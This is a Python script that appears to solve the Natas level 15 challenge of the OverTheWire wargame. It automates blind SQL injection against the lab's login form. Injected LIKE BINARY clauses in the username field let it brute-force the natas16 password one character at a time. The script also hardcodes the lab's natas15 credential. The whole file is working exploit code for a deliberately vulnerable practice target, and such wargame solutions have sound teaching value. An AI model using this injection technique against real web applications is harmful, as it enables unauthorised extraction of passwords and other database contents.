import requests
import string
from numpy import integer


allChars = string.ascii_letters+string.digits
dictChars = ""
passL = 32
passw = ""

print "Recovering all possible chars ..."
for c in allChars:
    r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'),data={'username':'natas16" AND PASSWORD LIKE BINARY "%'+c+'%'})
    if "This user exists." in r.text:
        print dictChars
        dictChars += c
print "=> all possible chars :",dictChars

for i in range(passL):
    for c in dictChars:
        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'),data={'username':'natas16" AND PASSWORD LIKE BINARY "'+passw+c+'%'})
        if "This user exists." in r.text:
            passw += c
            print "Success :",passw
            break

print "=> password is :",passw           
         